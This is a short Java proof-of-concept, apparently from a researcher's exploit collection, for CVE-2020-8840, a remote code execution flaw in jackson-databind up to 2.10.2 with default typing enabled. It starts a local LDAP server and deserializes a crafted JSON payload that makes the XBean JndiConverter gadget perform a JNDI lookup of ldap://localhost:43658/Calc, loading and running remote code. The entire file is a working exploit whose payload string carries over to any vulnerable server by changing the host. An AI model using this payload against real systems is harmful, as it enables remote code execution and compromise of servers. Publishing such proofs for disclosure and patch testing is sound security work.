package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * jackson-databind <= 2.10.2 RCE，需要开启DefaultType (reported by threedr3am)
 *
 * CVE-2020-8840
 *
 * XBean-reflect依赖的gadget
 *
 * <dependency>
 *       <groupId>org.apache.xbean</groupId>
 *       <artifactId>xbean-reflect</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class JndiConverterPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:43658/Calc\"}]";
    mapper.readValue(json, Object.class);
  }

}
